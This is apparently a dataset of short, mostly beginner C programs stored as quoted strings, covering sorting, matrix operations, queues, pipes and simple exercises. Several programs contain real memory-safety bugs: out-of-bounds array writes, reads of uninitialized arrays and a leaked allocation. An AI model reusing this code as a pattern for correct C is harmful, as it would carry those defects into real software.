    "#include <stdio.h>\n#include <string.h>\nvoid fit_str(char*, unsigned int);\nvoid fit_st2(char* str, unsigned int size);\nint main() {\n char dst[100] = \"\";\n char source[] = \"Start programming!\";\n char str[100] = \"\";\n int i = 123;\n double d = 3.14;\n sprintf(str, \"%0 5d.png %f\", i, d);\n puts(str);\n}\nvoid fit_str(char* str, unsigned int num) {\n for (int i = 0; i < num; i++)\n  putchar(*str++);\n}\nvoid fit_st2(char* str, unsigned int size) {\n if (strlen(str) > size)\n {\n  str[size] = '\\0';\n }\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nchar* replacechar(char *str, char *orig, char *rep) {\n    char *chr = str;\n    int i = 0;\n    while((chr = strchr(chr, *orig)) != ((void*)0)) {\n        *chr++ = *rep;\n        i++;\n    }\n    return (char*)str;\n}\nchar *correct(char *string)\n{\n  char *o_char = \"0\";\n  char o = 'O';\n  char *s_char = \"5\";\n  char s = 'S';\n  char *i_char = \"1\";\n  char i = 'I';\n  char *c = string;\n  while (*c)\n  {\n    if (strchr(s_char, *c))\n    {\n      *c = s;\n    }\n    if (strchr(o_char, *c))\n    {\n      *c = o;\n    }\n    if (strchr(i_char, *c))\n    {\n      *c = i;\n    }\n    *c++;\n  }\n  return string;\n}\nint main() {\n  char src[] = \"PAR15\";\n  printf(\"%s\\n\", correct(src));\n  return 0;\n}",
    "#include <stdio.h>\nvoid swap(int* a, int* b)\n{\n  int temp = *a;\n  *a = *b;\n  *b = temp;\n}\nint partition(int arr[], int low, int high)\n{\n  int pivot = arr[high];\n  int i = low - 1;\n  for (int j = low; j <= high - 1; j++) {\n    if (arr[j] <= pivot) {\n      i++;\n      swap(&arr[i], &arr[j]);\n    }\n  }\n  swap(&arr[i+1], &arr[high]);\n  return i + 1;\n}\nvoid quick_sort(int arr[], int low, int high)\n{\n  if (low < high) {\n    int index = partition(arr, low, high);\n    quick_sort(arr, low, index - 1);\n    quick_sort(arr, index + 1, high);\n  }\n}\nvoid print_array(int arr[], int size)\n{\n  for (int i = 0; i < size; i++) {\n    printf(\"%d\\n\", arr[i]);\n  }\n}\nint main(int argc, char* argv[])\n{\n  int arr[] = {100, 55, 4, 98, 10, 18, 90, 95, 43, 11, 47, 67, 89, 42, 49, 79};\n  int n = sizeof(arr) / sizeof(arr[0]);\n  quick_sort(arr, 0, n-1);\n  print_array(arr, n);\n  return 0;\n}",
    "int main(void)\n{\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n int beanburro[10];\n int fishtaco;\n int yuge;\n int smol;\n for (fishtaco=1; fishtaco<=10; fishtaco++) {\n  scanf(\"%d\", &beanburro[fishtaco]);\n }\n yuge = beanburro[0];\n smol = beanburro[0];\n for (fishtaco=1; fishtaco<10; fishtaco++) {\n  if (beanburro[fishtaco] > yuge) {\n   yuge = beanburro[fishtaco];\n  }\n  if (beanburro[fishtaco] < smol) {\n   smol = beanburro[fishtaco];\n  }\n }\n printf(\"Largest: %d\\n Smallest: %d\\n\\n\", yuge, smol);\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n int a;\n printf(\"Enter a number: \");\n scanf(\"%d\", &a);\n for(int i = 2; i < a; i++){\n  if (a%i == 0 && i != a){\n   return printf(\"\\n%d is not prime.\", a);\n  }\n }\n return printf(\"\\n%d is prime.\",a);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid printOut(int**, int);\nvoid freeElmt(int**, int);\nint main(void)\n{\n    int** packet = (int **)malloc(sizeof(int *) * 6);\n    int pcount = 0, i, curidx;\n    *packet = (int *)malloc(sizeof(int) * 5);\n    for (i = 0; i < 20; i++)\n    {\n        if (i == 5 || i == 8 || i == 11 || i == 14 || i == 17)\n            *(packet + ++pcount) = (int* )malloc(sizeof(int) * 3);\n        curidx = (i < 5) ? i : (i - 5) % 3;\n        scanf(\"%d\", &packet[pcount][curidx]);\n        if (*(*(packet + pcount) + curidx) == -1)\n        {\n            i++;\n            break;\n        }\n    }\n    printOut(packet, i);\n    freeElmt(packet, pcount);\n    return 0;\n}\nvoid printOut(int** target, int count)\n{\n    int curidx, i, tcount = 0;\n    for (i = 0; i < count; i++)\n    {\n        if (i == 5 || i == 8 || i == 11 || i == 14 || i == 17)\n            tcount++;\n        curidx = (i < 5) ? i : (i - 5) % 3;\n        printf(\"%d \", *(*(target + tcount) + curidx));\n    }\n    putchar('\\n');\n}\nvoid freeElmt(int** target, int tcount)\n{\n    int** pos = target;\n    for (; pos < target + tcount; pos++)\n        free(*pos);\n    free(target);\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\nvoid printMatrix(int** m, int r, int c){\n int i, j;\n for (i = 0; i < r; i++){\n  for (j = 0; j < c; j++)\n   printf(\"%d \", m[i][j]);\n  printf(\"\\n\");\n }\n}\nint vecMult(int* vA, int* vB, int n){\n int result = 0, i;\n for (i = 0; i < n; i++){\n  result += vA[i] * vB[i];\n }\n return result;\n}\nint** matrixMult(int* mA, int rA, int cA, int* mB, int rB, int cB){\n int** result = malloc(rA * sizeof(int *)), i, j;\n for (i = 0; i < rA; i++)\n  result[i] = malloc(cB * sizeof(int));\n for (i = 0; i < rA; i++){\n  for (j = 0; j < cB; j++){\n   int vB[rA];\n   int k;\n   for (k = 0; k < rB; k++) {\n    vB[k] = *((mB+k*cB) + j);\n   }\n   result[i][j] = vecMult(mA+i*cA, vB, cA);\n  }\n }\n return result;\n}\nint trace(int** m, int n){\n int total = 0, i;\n for (i = 0; i < n; i++)\n  total += m[i][i];\n return total;\n}\nint main(int argc, char** argv){\n if (argc <= 1) {\n  printf(\"NO FILE PROVIDED\\n\");\n  return 0;\n }\n if (access(*(argv+1), (0)) != 0){\n  printf(\"FILE DOES NOT EXIST\\n\");\n  return 0;\n }\n FILE* f = fopen(argv[1], \"r\");\n int rowsA, colsA, rowsB, colsB, i , j;\n fscanf(f, \"%d %d\\n\", &rowsA, &colsA);\n int matrixA[rowsA][colsA];\n for (i = 0; i < rowsA; i++)\n  for (j = 0; j < colsA; j++)\n   fscanf(f, \" %d \", &matrixA[i][j]);\n fscanf(f, \"%d %d\\n\", &rowsB, &colsB);\n int matrixB[rowsB][colsB];\n for (i = 0; i < rowsB; i++)\n  for (j = 0; j < colsB; j++)\n   fscanf(f, \" %d \", &matrixB[i][j]);\n if (colsA != rowsB){\n  printf(\"MULTIPLICATION NOT POSSIBLE\\n\");\n  return 0;\n }\n int tra = trace(matrixMult((int*)matrixA, rowsA, colsA, (int*)matrixB, rowsB, colsB), rowsA);\n FILE* out = fopen(\"part2_trace.dat\", \"w\");\n fprintf(out, \"%d\\n\", tra);\n fclose(out);\n fclose(f);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char *argv[])\n{\n    FILE *fp1, *fp2;\n    char *prog, *filename1, *filename2, *l1, *l2;\n    char line1[1000], line2[1000];\n    int linenum;\n    linenum = 0;\n    prog = argv[0];\n    filename1 = argv[1];\n    filename2 = argv[2];\n    if (argc == 3 && (fp1 = fopen(filename1, \"r\")) != ((void*)0) && (fp2 = fopen(filename2, \"r\")) != ((void*)0))\n    {\n        while((l1 = fgets(line1, 1000, fp1)) != ((void*)0) && (l2 = fgets(line2, 1000, fp2)) != ((void*)0))\n {\n     ++linenum;\n     if (strcmp(l1, l2) != 0)\n     {\n         printf(\"%s and %s are diff from line %d\\n\", filename1, filename2, linenum);\n  printf(\"%s:\", filename1);\n  fputs(l1, (stdout));\n  printf(\"%s:\", filename2);\n  fputs(l2, (stdout));\n  break;\n     }\n }\n        ++linenum;\n if (l1 == ((void*)0) && (l2 = fgets(line2, 1000, fp2)) != ((void*)0))\n {\n     printf(\"%s and %s are diff from line %d\\n\", filename1, filename2, linenum);\n     printf(\"%s:\", filename2);\n     fputs(l2, (stdout));\n }\n else if (l1 != ((void*)0) && l2 == ((void*)0))\n {\n     printf(\"%s and %s are diff from line %d\\n\", filename1, filename2, linenum);\n     printf(\"%s:\", filename1);\n     fputs(l1, (stdout));\n }\n        fclose(fp1);\n        fclose(fp2);\n    }\n    else\n    {\n        printf(\"Usage:%s file1 file2\\n\", prog);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    printf(\"every thing works fine\\n\");\n}",
    "#include<stdio.h>\nint main()\n{\n    int arr[30],i=0,n,j,item,temp,rp=-1;\n    printf(\"\\t\\tEnter the  total number of Elements  :\\t\");\n    scanf(\"%d\",&n);\n    for(i=0 ;i<n;i++){\n        printf(\"enter the [%d] element :\",i+1);\n        scanf(\"%d\",&arr[i]);\n    }\n     for(i=0;i<n;i++){\n        for(j=0;j<n-i;j++){\n            if(arr[j]>arr[j+1]){\n                    temp =arr[j];\n                    arr[j]=arr[j+1];\n                    arr[j+1]=temp;\n            }\n        }\n     }\n    for(i=0 ;i<n;i++){\n        printf(\"The [%d] element is :\",i+1);\n        printf(\"\\t%d\\n\",arr[i]);\n    }\n}",
    "#include <stdio.h>\nint bin_to_dec(int bin)\n{\n    int total = 0;\n    int potenc = 1;\n    while(bin > 0) {\n        total += bin % 10 * potenc;\n        bin = bin / 10;\n        potenc = potenc * 2;\n        fprintf((stderr), \"while\\n\");\n    }\n    return total;\n}\nint main(void)\n{\n    int dec = 0;\n    int bin = 0;\n    printf(\"Entre com um inteiro (0's e 1's): \");\n    scanf(\"%d\", &bin);\n    dec = bin_to_dec(bin);\n    printf(\"Bin = %d - Dec = %d\\n\", bin, dec);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n  int n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11, n12, first_sum, second_sum, total, check_digit;\n  printf(\"Enter UPC digits: \");\n  scanf(\"%1d%1d%1d%1d%1d%1d%1d%1d%1d%1d%1d\", &n1, &n2, &n3, &n4, &n5, &n6, &n7, &n8, &n9, &n10, &n11);\n  first_sum = n1 + n3 + n5 + n7 + n9 + n11;\n  second_sum = n2 + n4 + n6 + n8 + n10;\n  total = (3 * first_sum) + second_sum;\n  check_digit = 9 - ((total - 1) % 10);\n  if (check_digit == n12)\n    printf(\"VALID\");\n  else\n    printf(\"INVALID\");\n  return 0;\n}",
    "#include<stdio.h>\nint main(){\n    int currentCount=0,maxCount=0,interest,input = 47541521465,prev = 0;\n    scanf(\"%d\",&interest);\n    while(1){\n        prev = input;\n        scanf(\"%d\",&input);\n        if(!input){\n            break;\n        }\n        if(input == interest){\n            currentCount++;\n        }else{\n            if(maxCount < currentCount && prev == interest){\n                maxCount = currentCount;\n            }\n            currentCount = 1;\n        }\n    }\n    printf(\"%d\",maxCount);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void){\n int ano;\n printf(\"Insira um ano: \\n\");\n scanf(\"%i\",&ano);\n if (ano % 4 == 0){\n  printf(\"Ano bissexto\\n\");\n }else{\n  printf(\"N\u00e3o \u00e9 bissexto\\n\");\n }\n return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n#include<stdbool.h>\n\n\nvoid printArray(int arr[], int n) {\n int i;\n printf(\"[ \");\n for(i = 0; i<n; i++) {\n  printf(\"%d \", arr[i]);\n }\n printf(\"]\\n\");\n}\nvoid dijkstras(int G[10][10], int n, int source) {\n int dist[n];\n int visited[n];\n int parent[n];\n int i, j;\n for(i = 0; i<n; i++) {\n  dist[i] = 99999;\n  visited[i] = 0;\n  parent[i] = -1;\n }\n dist[source] = 0;\n for(i = 0; i<n; i++) {\n  int min_dist = 99999;\n  int index = 0;\n  for(j = 0; j<n; j++) {\n   if(!visited[j] && min_dist > dist[j]) {\n    min_dist = dist[j];\n    index = j;\n   }\n  }\n  visited[index] = 1;\n  for(j = 0; j<n; j++) {\n   if(G[index][j]) {\n    if(dist[j] > dist[index] + G[index][j]) {\n     dist[j] = dist[index] + G[index][j];\n     parent[j] = index;\n    }\n   }\n  }\n }\n printArray(dist, n);\n printArray(parent, n);\n for(i = 0; i<n; i++) {\n  printf(\"(%d - %d) ==> %d\\n\", parent[i], i, dist[i]);\n }\n}\nint main()\n{\n int n, i, j;\n scanf(\"%d\", &n);\n int source;\n scanf(\"%d\", &source);\n int G[10][10];\n for(i = 0; i<n; i++) {\n     for(j = 0; j<n; j++) {\n         scanf(\"%d\", &G[i][j]);\n     }\n }\n dijkstras(G, n, source);\n return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main(){\n   printf(\"Welcome to Git World\");\n}",
    "#include <stdio.h>\nint main(){\n    int rod1, rod2;\n    scanf(\"%d\", &rod1);\n    int vet1[rod1];\n    for(int cont = 0; cont < rod1; cont++){\n        scanf(\"%d\", &vet1[cont]);\n    }\n    scanf(\"%d\", &rod2);\n    int vet2[rod2];\n    for(int cont = 0; cont < rod2; cont++){\n        scanf(\"%d\", &vet2[cont]);\n    }\n    int vet3[rod1 + rod2];\n    for(int cont = 0; cont < (rod1 + rod2); cont++){\n         if(cont < rod1){\n            vet3[cont] = vet1[cont];\n         }else{\n            vet3[cont] = vet2[cont - rod1];\n         }\n    }\n    printf(\"%d \\n \", rod1 + rod2);\n    for(int cont = 0; cont < (rod1 + rod2); cont++){\n         printf(\"%d \", vet3[cont]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nint main() {\ndouble point;\n int a[4];\n int i,j;\nprintf(\"Coefficients: \");\n for(i=0; i<4 ; i++){\n scanf(\"%d\", &a[i]);}\nprintf(\"Initial Point: \");\nscanf(\"%lf\",&point);\n double fx, dfx, abfx;\n abfx=1;\n for(j=0; j<50; j++){\n   fx=a[0] + (a[1]*point) + (a[2]*point*point) + (a[3]*point*point*point);\n    dfx= a[1] + (2*a[2]*point) + (3*a[3]*point*point);\n    if(fx<0){\n      abfx=-fx;\n      }else{abfx=fx;}\n        if (abfx<=.00001){\n     printf(\"%.5lf\\n\", point);\n      break;}\n        if (dfx == 0){\n    printf(\"%.5lf\\n\", point);\n     break;}\n    point -= fx/dfx;\n    if(j==(50 -1))\n        printf(\"%.5lf\\n\", point);\n}\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void) {\n    char *world = malloc(6);\n    world = \"World\";\n    printf(\"Hello %s!\", world);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    for (float count = 1, i = 0; i <= 2.01; count += 0.2, i += 0.2) {\n        for (float j = count; j <= count + 2.01; j++)\n            ((i == 0.0) || (i == 1.0) || (i >= 2.0)) ? printf(\"I=%.0f J=%.0f\\n\", i, j) : printf(\"I=%.1f J=%.1f\\n\", i, j);\n    }\n    return 0;\n}",
    "#include<stdio.h>\nvoid invertPos(int v[],int pos1,int pos2){\n    int aux;\n    aux = v[pos1];\n    v[pos1] = v[pos2];\n    v[pos2] = aux;\n}\nint main(void){\n    int tam;\n    scanf(\"%d\",&tam);\n    int v[tam];\n    for(int i = 0 ;i<tam;i++){\n        scanf(\"%d\",&v[i]);\n    }\n    int p1,p2;\n    printf(\"posicao 1 e 2\\n\");\n    scanf(\"%d%d\",&p1,&p2);\n    invertPos(v,p1,p2);\n    printf(\"invertido\\n\");\n    for(int i=0;i<tam;i++){\n        printf(\"%d \",v[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n int l,c,i,j;\n printf(\"Inf QT de Linhas: \");\n scanf(\"%d\",&l);\n printf(\"Inf QT de Colunas: \");\n scanf(\"%d\",&c);\n int m[l][c],t[c][l];\n for(i=0;i<l;i++){\n  for(j=0;j<c;j++){\n   printf(\"Inf Valor P/ L:%d C:%d : \",i,j);\n   scanf(\"%d\",&m[i][j]);\n  }\n }\n printf(\"\\nMatriz\\n\");\n for(i=0;i<l;i++){\n  printf(\"|\");\n  for(j=0;j<c;j++){\n   printf(\"%d|\",m[i][j]);\n  }\n  printf(\"\\n\");\n }\n for(i=0;i<l;i++){\n  for(j=0;j<c;j++){\n   t[j][i]=m[i][j];\n  }\n }\n printf(\"\\nMatriz Transposta\\n\");\n for(i=0;i<c;i++){\n  printf(\"|\");\n  for(j=0;j<l;j++){\n   printf(\"%d|\",t[i][j]);\n  }\n  printf(\"\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int a = 0;\n    a = sizeof(1);\n    printf(\"%d\\n\",a);\n    a = 1 > 2 ? 1:2;\n    printf(\"%d\\n\",a);\n    int *c;\n    c = &a;\n}",
    "#include <stdio.h>\n int main(void)\n {\n  int N=9,B[N],temp,i=0,j=8;\n  int A[N];\n  A[0]=5,A[1]=6,A[2]=2,A[3]=7,A[4]=9,A[5]=1,A[6]=8,A[7]=3,A[8]=7;\n  A[0] = B[N/2];\n  while(i<=j){\n   if (A[i]<B[N/2])\n   {\n    A[i]=B[i];\n    i++;\n   }else if (A[i] > B[N/2])\n   {\n    A[i] = B[j];\n    j--;\n   }\n   if (A[j]<B[N/2])\n   {\n    A[j] = B[i];\n    i++;\n   }else if (A[j]>B[N/2])\n   {\n    A[j]=B[j];\n    j--;\n   }\n  }\n  for (int k = 0; i < 9; ++i)\n  {\n   printf(\"%d\\n\",B[k]);\n  }\n  return 0;\n }",
    "#include <sys/types.h>\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n\n\n\nint main(){\n    char write_msg[30] = \"okaydone\";\n    char read_msg[30];\n    int fd[2];\n    pid_t PID;\n    int pipe_status = pipe(fd);\n    if (pipe_status == -1) {\n        fprintf((stderr), \"Pipe creation failed \\n\");\n        return 1;\n    } else {\n        printf(\"Successfuly created a pipe \\n\");\n    }\n    PID = fork();\n    if (PID < 0){\n        fprintf((stderr), \" Fork failure \\n\");\n        return 1;\n    } else if (PID > 0) {\n        close(fd[0]);\n        write(fd[1], write_msg, 30);\n        close(fd[1]);\n    } else {\n        close(fd[1]);\n        read(fd[0], read_msg, 30);\n        close(fd[0]);\n        printf(\" I read this message: %s\", read_msg);\n        return 1;\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int i,j;\n    i=j=0;\n            do{\n                    printf(\"\\nThis program Explains  do-while loop\\nThis programs shows how many times you gave values to this program\\nPress 0 to see the no.of values you given.\\nEnter any Number :\");\n                    scanf(\"%d\",&i);\n                    printf(\"The Given NO. is %d\\n\",i);\n                    j=j+1;\n                } while(i!=0);\n                printf(\"%d times you gave values to this program.\",j-1);\n}",
    "#include <stdio.h>\nlong factorial(int num)\n{\n    if (num <= 0)\n        return 1;\n    else\n    {\n        return num * factorial(num - 1);\n    }\n}\nint main()\n{\n    int num = factorial(10);\n    printf(\"The Result: %d \\n\", num);\n}",
    "#include <stdio.h>\nvoid QuickSort(int a[],int l,int r)\n{\n if (l>=r) return ;\n int p=a[l],pl=l,pr=r;\n while (l<r)\n {\n  while (l<r&&p<=a[r]) --r;if (l<r) a[l++]=a[r];\n  while (l<r&&a[l]< p) ++l;if (l<r) a[r--]=a[l];\n }\n a[l]=p;QuickSort(a,pl,l-1);QuickSort(a,l+1,pr);\n return ;\n}\nint main()\n{\n int n=10,p[11],i;\n puts(\"Enter 10 numbers to be sorted: \");\n for (i=1;i<=n;i++) scanf(\"%d\",&p[i]);\n QuickSort(p,1,n);\n printf(\"In sorted order:\");\n for (i=1;i<=n;i++) printf(\" %d\",p[i]);putchar('\\n');\n return 0;\n}",
    "#include<stdio.h>\nvoid squares(int v) {\n  for (int i=1;i<v+1;i++) {\n    printf(\"%d \", i*i);\n  }\n  printf(\"\\n\");\n}\nint main() {\n  squares(10);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main(int argc, char **argv)\n{\n    int i, j;\n    if(argc < 2){\n        fprintf((stderr), \"Falta tama\u00f1o de filas/columnas\\n\");\n        exit(-1);\n    }\n    unsigned int N = atoi(argv[1]);\n    int *vector, *result, **matriz;\n    vector = (int *) malloc(N*sizeof(int));\n    result = (int *) malloc(N*sizeof(int));\n    matriz = (int **) malloc(N*sizeof(int*));\n    for (i=0; i<N; i++)\n        matriz[i] = (int*) malloc(N*sizeof(int));\n    for (i=0; i<N; i++){\n        for (j=i; j<N; j++){\n            matriz[i][j] = 6;\n         vector[i] = 4;\n         result[i]=0;\n  }\n    }\n    printf(\"Matriz:\\n\");\n    for (i=0; i<N; i++){\n        for (j=0; j<N; j++){\n            if (j >= i){\n                printf(\"%d \", matriz[i][j]);\n            }else{\n                printf(\"0 \");\n   }\n        }\n        printf(\"\\n\");\n    }\n    printf(\"Vector:\\n\");\n    for (i=0; i<N; i++){\n        printf(\"%d \", vector[i]);\n }\n    printf(\"\\n\");\n    for (i=0; i<N; i++){\n        for (j=i; j<N; j++){\n             result[i] += matriz[i][j] * vector[j];\n  }\n }\n    printf(\"Resultado:\\n\");\n    for (i=0; i<N; i++){\n        printf(\"%d \", result[i]);\n }\n    printf(\"\\n\");\n    for (i=0; i<N; i++)\n        free(matriz[i]);\n     free(matriz);\n     free(vector);\n     free(result);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid parser(char *string)\n{\n    int in = 0;\n    int index = 0;\n    for (int i = 0; i < strlen(string); i++)\n    {\n        if (string[i] == '<')\n        {\n            in = 1;\n            continue;\n        }\n        else if (string[i] == '>')\n        {\n            in = 0;\n            continue;\n        }\n        if (in == 0)\n        {\n            string[index] = string[i];\n            index++;\n        }\n    }\n    string[index] = '\\0';\n    while (string[0] == ' ')\n    {\n        for (int i = 0; i < strlen(string); i++)\n        {\n            string[i] = string[i + 1];\n        }\n    }\n    while (string[strlen(string) - 1] == ' ')\n    {\n        string[strlen(string) - 1] = '\\0';\n    }\n}\nint main()\n{\n    char string[] = \"    <harrysdfsdfsdf>this is a heading    </harry>     \";\n    parser(string);\n    printf(\"The parsed string is ~~%s~~\", string);\n    return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nint vert[10][10] = {\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 1, 1, 0, 0, 0, 0, 0, 0},\n    {0, 0, 1, 1, 1, 0, 0, 0, 0, 0},\n    {0, 0, 1, 1, 1, 0, 0, 0, 0, 0},\n    {0, 0, 1, 0, 1, 0, 0, 0, 1, 0},\n    {1, 0, 0, 0, 1, 0, 0, 0, 1, 0},\n    {1, 0, 0, 0, 1, 0, 0, 0, 0, 0},\n    {1, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n};\nint clum[10][10] = {\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 1, 0, 0, 1, 1, 1, 1, 1},\n    {0, 0, 1, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 1, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 1, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 1, 1, 0, 1, 1, 1, 0, 0},\n    {0, 0, 0, 0, 0, 1, 1, 1, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0, 0, 0, 0},\n};\nint fire(int row, int col, int board[10][10]){\n    if(board[row][col] == 1){\n        return 1;\n    }\n    return 0;\n}\nint strat_method(int board[10][10]){\n    int hits = 0;\n    for(int i = 0; i < 10; i++){\n        for(int j = 0; j < 10; j++){\n            int hit_miss = fire(i, j, board);\n            if(hit_miss == 1){\n                hits++;\n                if(hits > 16){\n                    return 0;\n                }\n            }\n        }\n    }\n    return 1;\n}\nint main(int argc, char* argv[]){\n    int result = strat_method(vert);\n    if(result != 0){\n        printf(\"Error occured with strategy\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int a, b, c;\n    scanf(\"%d%d%d\", &a, &b, &c);\n    if (a == b || a == c || b == c) puts(\"S\");\n    else if ((a + b) == c) puts(\"S\");\n    else if ((b + c) == a) puts(\"S\");\n    else if ((a + c) == b) puts(\"S\");\n    else puts(\"N\");\n    return 0;\n}",
    "int main() {\n  return sizeof(char);\n}",
    "int main() {\n    int c = 40;\n int b = 2;\n    if(b > c) {\n        int a = 20;\n        return 0;\n    } else {\n        return 1;\n    }\n}",
    "#include <stdio.h>\nint asum(int array[], int n){\n    int *p, t = 0;\n    p = array;\n    for (size_t i = 0; i < n; i++){\n        t+=*(p+i);\n    }\n    return t;\n}\nint main(){\n    int dizi[] ={1,3,5,7,9,11,13};\n    printf(\"%d\", asum(dizi, sizeof(dizi)/sizeof(int)));\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\n\nvoid enqueue(int Q[], int* front, int* rear, int x)\n{\n  if(*rear == 10 -1)\n  {\n    printf(\"Queue is full\\n\\n\\n\");\n  }\n  else if(*front == -1)\n  {\n    *front=0;\n    *rear=0;\n    Q[*rear] = x;\n    printf(\"Enqueued successfully\\n\\n\\n\");\n  }\n  else\n  {\n    Q[++(*rear)] = x;\n    printf(\"Enqueued successfully\\n\\n\\n\");\n  }\n}\nint dequeue(int Q[], int* front, int* rear)\n{\n  int temp;\n  if(*front==-1)\n  {\n    printf(\"Queue is empty\\n\");\n    return 0;\n  }\n  else if(*front==*rear)\n  {\n    temp=*front;\n    *front=-1;\n    *rear=-1;\n    return(Q[temp]);\n  }\n  else\n  {\n    return(Q[(*front)++]);\n  }\n}\nvoid display(int Q[], int* front, int* rear)\n{\n  int i;\n  if(*front==-1)\n    printf(\"Queue is empty\\n\\n\\n\");\n  else\n  {\n    printf(\"Queue: \");\n    for(i=*front; i<=*rear; i++)\n    {\n        printf(\"%d  \", Q[i] );\n    }\n    printf(\"\\n\\n\\n\");\n  }\n}\nint main()\n{\n  char choice;\n  int x,Q[10],front=-1,rear=-1;\n  while (1)\n  {\n    printf(\"1. Enqueue\\n\");\n    printf(\"2. Dequeue\\n\");\n    printf(\"3. Display\\n\");\n    printf(\"4. Exit\\n\");\n    printf(\"Enter Your choice: \");\n    choice = getchar();\n    fflush((stdin));\n    switch (choice)\n    {\n      case '1':\n        printf(\"Enter the element to enqueue: \");\n        scanf(\"%d\", &x);\n        fflush((stdin));\n        enqueue(Q,&front,&rear,x);\n        break;\n      case '2':\n        printf(\"The element dequeued is: %d\\n\\n\\n\", dequeue(Q, &front, &rear));\n        break;\n      case '3':\n        display(Q, &front, &rear);\n        break;\n      case '4':\n        exit(0);\n      default:\n        printf(\"Wrong choice\\n\\n\\n\");\n      }\n  }\n  return 0;\n}",
    "#include<stdio.h>\nint main(){\n    int a;\n    int b;\n    int c;\n    int max;\n    scanf(\"%d%d%d\",&a,&b,&c);\n    if (a <= b){\n        if(b >= c){\n         max =b;\n    } else {\n         max=c;\n    } } else {\n        if (a <= c) {\n         max=a;\n        } else {\n         max=c;\n        }\n    }\n    if ((a+b+c-(2*max))<=0) {\n        printf(\"Invalid Triangle\");\n    }\n    if ((a+b+c-(2*max))>=0) {\n        if ((a*a)+(b*b)+(c*c)==(2*max*max)) {\n            printf(\"Right Triangle\");\n        } else\n        if((a*a)+(b*b)+(c*c)>=(2*max*max)) {\n            printf(\"Acute Triangle\");\n        } else\n        if((a*a)+(b*b)+(c*c)<=(2*max*max)) {\n            printf(\"Obtuse Triangle\");\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint cal[8][5];\nint main()\n{\n    int i, j;\n    int sum;\n    for (i = 0; i < 7; i++) {\n        for (j = 0; j < 4; j++) {\n            printf(\"day=%d, meal=%d?\", i, j);\n            scanf(\"%d\", &cal[i][j]);\n        }\n    }\n    for (i = 0; i < 7; i++) {\n        sum = 0;\n        for (j = 0; j < 4; j++) {\n            sum += cal[i][j];\n        }\n        cal[i][4] = sum;\n    }\n    for (j = 0; j < 4; j++) {\n        sum = 0;\n        for (i = 0; i < 7; i++) {\n            sum += cal[i][j];\n        }\n        cal[7][i] = sum / 7;\n    }\n    for (i = 0; i < 8; i++) {\n        for (j = 0; j < 5; j++) {\n            printf(\"%4d \", cal[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n  float base, altura, area;\n  printf(\"Base: \");\n  scanf(\"%f\", &base);\n  printf(\"Altura: \");\n  scanf(\"%f\", &altura);\n  area = base * altura / 2;\n  printf(\"Area = %.2f\", area);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    size_t i;\n    for(i=10;i<=10;i--){\n        printf(\"%zu\\n\", i);\n    }\n    printf(\"%zu\\n\", i);\n}",
    "#include <stdio.h>\nint main() {\n    int i = 0;\n    FILE *fpw = popen(\"cat\", \"w\");\n    for(i=0;i<10;i++) {\n        fprintf(fpw, \"Count = %d\\n\", i);\n    }\n    fputs(\"Data is printed by cat.\\n\", fpw);\n    pclose(fpw);\n    return 0;\n}",
    "#include <stdio.h>\nint parOuImpar(int valor, int *quantidade) {\n    if (valor % 2 == 0) {\n        (*quantidade)++;\n        return 1;\n    } else return 0;\n}\nint main(){\n   int num;\n   scanf(\"%d\", &num);\n   int quantidade = 0;\n   if (parOuImpar(num, &quantidade)) printf(\"O dado \u00e9 par e isto ocorreu %d vezes\", quantidade);\n   else printf(\"O dado \u00e9 impar\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void)\n{\n    if (isatty(0)) printf(\"%s\\n\", \"yes\");\n    else printf(\"%s\\n\", \"no\");\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int favNum = 100;\n    char myChar = 'k';\n    printf(\"My char is %c\\n\", myChar);\n    return 0;\n}",
